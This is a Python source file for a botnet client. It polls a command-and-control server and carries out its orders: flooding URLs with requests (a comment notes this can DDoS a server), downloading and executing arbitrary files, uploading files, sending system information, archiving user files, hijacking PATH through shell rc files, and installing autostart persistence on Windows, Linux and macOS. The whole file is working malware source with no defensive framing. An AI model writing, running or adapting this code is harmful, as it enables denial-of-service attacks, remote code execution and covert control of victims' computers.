# 3rd party libs
import requests
import psutil

# Built in libs
import time
import uuid
import json
from os import remove, sep, path, environ, pathsep
import os
import stat
from sys import exit
import signal
from random import randint, choice
from tempfile import mkdtemp, NamedTemporaryFile
from subprocess import call, PIPE, Popen
from glob import glob
from shutil import make_archive, rmtree, get_archive_formats, move
import platform
import json

# Dictionary with urls as a key and filenames as values
TEMP_FILES = {}
# FOLDER KEYS
ARCHIVE_FOLDER = "FOLDER_PATH_KEY"
# URL for Command and Control Server
CC_BASE_PATH = "http://localhost:8000"
# Unique ID for the BOT
BOT_ID = uuid.getnode()

# Helper functions
def insensitive_glob(pattern, **kwargs):
    # Make glob searching case insensitive
    def either(c):
        return '[%s%s]'%(c.lower(),c.upper()) if c.isalpha() else c
    return glob(''.join(map(either,pattern)), **kwargs)


def get_random_filename():
    # Return a random filename without an extension
    alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', '1', '2', '3', '4', '5', '6', '7']

    return "".join(choice(alphabet) for i in range(9))


def find_by_pattern(glob_pattern="**.txt"):
    # Returns a list of full file paths matching the pattern
    # See: https://docs.python.org/3/library/glob.html#module-glob
    return insensitive_glob(glob_pattern, recursive=False)


def get_command():
    # Gets a new command from the server
    r = requests.get("{}/command.json".format(CC_BASE_PATH), params={"id": BOT_ID})
    commands = r.json()["commands"]

    for command in commands:
        # Get the command to run
        action = command['action']

        if action == "fetch":
            # Get the url
            url = command['url']

            # Are we running for a # or until a time
            if 'count' in command:
                for i in range(command['count']):
                    fetch_page(url)
            elif 'until' in command:
                while True:
                    if time.time() > int(command['until']):
                        break

                    fetch_page(url)
        elif action == "download":
            # Download the item, the item will be stored in TEMP_FILES
            url = command['url']
            download_item(url)
        elif action == "execute":
            # Run a file that's already been downloading
            if 'url' in command and command['url'] in TEMP_FILES:
                execute_item(TEMP_FILES[command['url']])
            elif 'command' in command:
                executable_command = command['command']
                # If we have a windows version of the command and are on windows
                if platform.system() == "Windows" and "Windows" in executable_command:
                    execute_item(*executable_command["Windows"])
                elif platform.system() != "Windows" and "Unix" in executable_command:
                    # If we have a unix version and are not on windows
                    execute_item(*executable_command["Unix"])

        elif action == "system_data":
            # URL to send data too
            url = command['url']
            data = json.dumps(get_system_information())
            post_data(url, data)


def fetch_page(url, **kwargs):
    # Does an HTTP GET request to any URL
    # Can be used to DDOS a server
    return requests.get(url, **kwargs)


def download_item(url, **kwargs):
    # Does an HTTP GET request to the URL and save the file
    r = requests.get(url, **kwargs)

    if r.status_code != 200:
        return False

    if url in TEMP_FILES:
        remove(TEMP_FILES[url])

    tmp_file = NamedTemporaryFile(delete=False)

    for chunk in r:
        tmp_file.write(chunk)

    tmp_file.close()

    TEMP_FILES[url] = tmp_file.name

    return True


def upload_item(url, file_path, **kwargs):
    # Uploads the file contents to the URL

    with open(file_path, 'rb') as file:
        data = {'file': file}
        r = requests.post(url, files=data, **kwargs)
    return r

def post_data(url, data, **kwargs):
    requests.post(url, data=data, params={"id": BOT_ID}, **kwargs)


def find_by_filename(filename):
    # Returns a list of full file paths matching the filename,
    # can be a partial filename.
    return find_by_pattern("{}{}**{}{}{}{}".format(path.expanduser('~'), sep, sep, '**', filename, '**'))


def execute_item(path, *args):
    # TODO: Pipe contents at some time
    make_executable(path)
    return call([path, *args], shell=True)#, stdout=PIPE, stderr=PIPE)


def make_executable(path):
    # Make the file at the path location executable, if it's already
    # executable do nothing

    if platform.system() != "Windows":
        # Check to see if it's already executable, if it is do nothing
        if not os.access(path, os.X_OK) and os.path.isfile(path):
            # Make it executable
            os.chmod(path, 0o711)


def add_to_path(path):
    # Adds a path to the PATH env variable, returns the new path
    # path spoofing

    environ["PATH"] = path + pathsep + environ["PATH"]

    # Make change permanent
    if platform.system() == "Windows":
        # NOTE setx will truncate the stored string to 1024 bytes, potentially corrupting the PATH
        # from: http://stackoverflow.com/questions/8358265/how-to-update-path-variable-permanently-from-cmd-windows
        path_string = "setx PATH \"{}{}%PATH%\"".format(path, pathsep)
        execute_item(path_string)
    else:
        path_string = "export PATH=\"{}{}$PATH\"".format(path, pathsep)

        # Add more rc file locations for different shells
        for rc in [".bashrc", ".zshrc"]:
            filename = "{}{}{}".format(os.path.expanduser('~'), sep, rc)
            if os.path.isfile(filename):
                with open(filename, "a") as rc_file:
                    rc_file.write(path_string)

    return environ["PATH"]


def archive_files(root_folder):
    # Returns the location of the archive containing the selected files

    # Create the archive folder once
    if ARCHIVE_FOLDER not in TEMP_FILES:
        TEMP_FILES[ARCHIVE_FOLDER] = mkdtemp()

    tmp_dir = TEMP_FILES[ARCHIVE_FOLDER]

    filename = get_random_filename()

    archive_base_name = "{}{}{}".format(tmp_dir, sep, filename)

    # Get the last available format for this platform
    file_format = get_archive_formats()[-1][0]

    archive_filename = make_archive(archive_base_name, format=file_format, base_dir=root_folder, root_dir="/")

    TEMP_FILES[archive_base_name] = archive_filename

    return archive_filename


def get_system_information():
    # Get system information in a dictionary

    data = {
        "cpu_cores": psutil.cpu_count(False),
        "cpu_count": psutil.cpu_count(),
        "memory": psutil.virtual_memory().total,
        "network": psutil.net_if_addrs(),
        "users": psutil.users()
    }

    disks = psutil.disk_partitions()
    disks_capacity = {}

    for disk in disks:
        disks_capacity[disk.mountpoint] = psutil.disk_usage(disk.mountpoint).total

    data["disks"] = disks_capacity

    return data

def move_file(path, destination):
    # Move a file to another destination, this can be a move or replace
    move(path, destination)


def auto_start_exec(path):
    # Moves a file to the OS's auto start location

    if platform.system() == "Windows":
        move_file(path, "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
    elif platform.system() == "Linux":
        name = get_random_filename()
        filename = "{}/.config/autostart/{}.desktop".format(os.path.expanduser('~'), name)
        with open(filename, "wb") as f:
            f.write(
                "[Desktop Entry]\n"
                "Exec={}\n"
                "Icon=system-run\n"
                "Path=\n"
                "Terminal=false\n"
                "Type=Application\n".format(path))
    elif platform.system() == "Darwin":
        name = get_random_filename()
        filename = "{}/Library/LaunchDaemons/{}.plist".format(os.path.expanduser('~'), name)
        with open(filename, "wb") as f:
            f.write(
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                "<plist version=\"1.0\">"
                "<dict>"
                    "<key>Label</key>"
                    "<string>com.{}</string>"
                    "<key>ProgramArguments</key>"
                    "<array>"
                        "<string>{}</string>"
                    "</array>"
                    "<key>KeepAlive</key>"
                        "<true/>"
                "</dict>"
                "</plist>".format(name, path))


def exit_gracefully():
    print("Exiting")
    print("Files to clean: {}".format(len(TEMP_FILES)))

    # DELETE FOLDER before other things
    if ARCHIVE_FOLDER in TEMP_FILES:
        try:
            rmtree(TEMP_FILES[ARCHIVE_FOLDER])
        except:
            pass

    for v in TEMP_FILES.values():
        try:
            remove(v)
        except:
            pass
    exit()


def main():
    while(True):
        print("Checking...")

        try:
            get_command()
        except:
            pass
        finally:
            time.sleep(randint(10, 100))

if __name__=="__main__":
    try:
        main()
    except Exception as e:
        print(e)
    finally:
        exit_gracefully()
